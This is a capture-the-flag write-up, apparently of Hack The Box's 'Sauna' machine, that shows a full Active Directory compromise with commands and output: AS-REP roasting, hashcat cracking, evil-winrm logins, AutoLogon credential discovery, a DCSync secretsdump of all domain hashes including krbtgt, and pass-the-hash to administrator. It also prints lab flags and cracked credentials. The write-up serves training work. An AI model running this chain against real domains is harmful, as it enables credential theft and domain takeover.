
Getting setup we'll start with

```
~/hackthebox/sauna > nmap -sV -sC -Pn 10.129.193.251 > nmap
~/hackthebox/sauna > gethosts 10.129.193.251                                              19:26:09
SMB         10.129.193.251  445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
~/hackthebox/sauna > cat /etc/hosts                                                       19:26:16
10.129.193.251     SAUNA.EGOTISTICAL-BANK.LOCAL EGOTISTICAL-BANK.LOCAL SAUNA
```

The gethosts is just a quick automation script I have added to my .zshrc but it looks like this if you want to use it (I have NOPASSWD for my user when sudo otherwise yours would need to be adjusted.)
```
gethosts() {
    if [ -z "$1" ]; then
        echo "Usage: gethosts <IP/Subnet>"
        return 1
    fi
    netexec smb "$1" --generate-hosts-file hosts && \
    sudo sh -c 'cat hosts /etc/hosts | sponge /etc/hosts'
}
```

Nmap reveals:

```
Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-08 19:16 -0400
Nmap scan report for 10.129.193.251
Host is up (0.100s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-09 06:17:12Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-09T06:17:19
|_  start_date: N/A
|_clock-skew: 7h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.80 seconds
```

After doing some enumeration on open services and spending some time looking around the website I stumbled upon what I thought could potentially be a solution to find a foothold. 

```
http://egotistical-bank.local/about.html
```

From here we can gather the names all of the users, input them into a file, and create permutation of users. I used my own script to do this:
```
https://github.com/0xJam3z/0xJam3z-Toolkit/blob/main/userpermutation.py
```
```
~/h/sauna > cat users.txt               20:12:51
Steven Kerb
Hugo Bear
Fergus Smith
Shaun Coins
Bowie Taylor
Sophie Driver

~/h/sauna > python userpermutation.py users.txt
[+] Wrote 36 usernames to users_permutation.txt
```

After a lot of trial and error going down different rabbit holes, I found the (what should have been obvious solution.)

```
~/hackthebox/sauna > GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile users_permutation.txt -no-pass -dc-ip 10.129.193.251 > hashes
```

This produces a hash for fsmith via TGT. Now we'll pass this over to hashcat.

```
~/hackthebox/sauna > hashcat -m 18200 hashes /usr/share/wordlists/rockyou.txt             20:45:06
hashcat (v6.2.6) starting

nvmlDeviceGetFanSpeed(): Not Supported

CUDA API (CUDA 12.9)
====================
* Device #1: NVIDIA GeForce RTX 2060, 5648/5738 MB, 30MCU

OpenCL API (OpenCL 3.0 CUDA 12.9.90) - Platform #1 [NVIDIA Corporation]
=======================================================================
* Device #2: NVIDIA GeForce RTX 2060, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 263 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:cf5d96aaebcb53742ba075365c143e61$c68545febe925e0751dd367b2ac21e66912ed628cfdfc68b34b59d6f0526c8cbdfd48b6797de61de8db67e8a1d8e8af7604988be326d93e3cad04105917a438718229cfd11bdf41fa5a7997cff6a8fb85709df0cb8d271fe3cc494308555663a0359ff4d26ee3a2728ee1341f6b93c8cd90c59b5572989e4a7d3db44c38ffcf297c7628ed8dbc2ddee43354eeaed731774d43e173846af43a61a7365b9e77196fbc097fdeb913c946316991204a34bf1d753efd2d7304f762605a94c4865f15b78fd1ecdb2f76fdc0f98420dce1404e501915fbc035143009785faeecef7153fd26fb74a45628026d55075c553ce4430f3e007134cb522608e49cb7c5262c5c5:Thestrokes23

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:cf5d96a...62c5c5
Time.Started.....: Tue Jul  8 20:45:25 2025 (1 sec)
Time.Estimated...: Tue Jul  8 20:45:26 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  8749.7 kH/s (7.07ms) @ Accel:512 Loops:1 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10813440/14344385 (75.38%)
Rejected.........: 0/10813440 (0.00%)
Restore.Point....: 10321920/14344385 (71.96%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: ahki_22 -> Ms.KEL
Hardware.Mon.#1..: Temp: 64c Util: 38% Core:1425MHz Mem:6801MHz Bus:8

Started: Tue Jul  8 20:45:08 2025
Stopped: Tue Jul  8 20:45:28 2025
```

So now we have fsmith:Thestrokes23 -- passing over to evil-winrm we get our user.txt!

```
~/hackthebox/sauna > evil-winrm -i 10.129.193.251 -u 'fsmith' -p Thestrokes23         23s 20:48:14
/home/jam3z/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems
/home/jam3z/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\FSmith\Desktop> dir


    Directory: C:\Users\FSmith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         7/8/2025  11:00 PM             34 user.txt


*Evil-WinRM* PS C:\Users\FSmith\Desktop> type user.txt
c5bdbd1db2888c1de262f61015ef25d1
*Evil-WinRM* PS C:\Users\FSmith\Desktop>
```

Per the usual the first thing I check is privs on the account.

```
*Evil-WinRM* PS C:\Users\FSmith> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

My initial thoughts on owning the system are SeMachineAccountPrivilege → RBCD abuse → escalate to SYSTEM/domain admin. After sampling in bloodhound I found this wouldn't work. So uploaded winpeas and once ran found something interesting.

```
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
```

Now after making the mistake of jumping the gun and trying to evil-winrm into svc_loanmanager I missed the fact the user account is actually:

```
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/25/2020   1:05 PM                Administrator
d-----        1/23/2020   9:52 AM                FSmith
d-r---        1/22/2020   9:32 PM                Public
d-----        1/24/2020   4:05 PM                svc_loanmgr
```

So after revising my login...
```
~/hackthebox/sauna > evil-winrm -i 10.129.193.251 -u 'svc_loanmgr' -p Moneymakestheworldgoround!
/home/jam3z/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems
/home/jam3z/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents>
```

After doing some basic priv checks on the account I decided I'd go ahead and run this account through bloodhound to see if I've missed something.

```
nxc ldap 10.129.193.251 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!' --bloodhound -c ALL --dns-server 10.129.193.251
```

<img src="Pasted image 20250708215130.png">

Immediately we see we can DCSync from this account. Easy secretsdump.py to get admin hash, then we'll just pass the hash over to evil-winrm and get our root flag!

```
~ > secretsdump.py 'EGOTISTICAL-BANK.LOCAL'/'svc_loanmgr':'Moneymakestheworldgoround!'@10.129.193.251
/home/jam3z/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.13.0.dev0+20250701.160936.2e87ade - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:bc559eef49f031306447cebd90eed446:::
WINRMDROP$:4601:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:6c4fcbbe62506ac243e12cbc62009fb89f2572f17f17ca8c42a6bde3f865416a
SAUNA$:aes128-cts-hmac-sha1-96:15d1394c7d7245c78bf2867d13d514f4
SAUNA$:des-cbc-md5:5bfb9215e064100e
WINRMDROP$:aes256-cts-hmac-sha1-96:8c6f666149c1baed9da135fd1345412158d63549de5423d1ce8467220deebe0a
WINRMDROP$:aes128-cts-hmac-sha1-96:73b96af3b2086c9bc9b271bff052a408
WINRMDROP$:des-cbc-md5:f44a3151f8625804
[*] Cleaning up...
```

```
~ > evil-winrm -i 10.129.193.251 -u 'administrator' -H 823452073d75b9d1cf70ebdf86c7f98e
/home/jam3z/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems
/home/jam3z/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
e4bb162b34065dbb4402e4c2db37b75d
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```

Sauna rooted!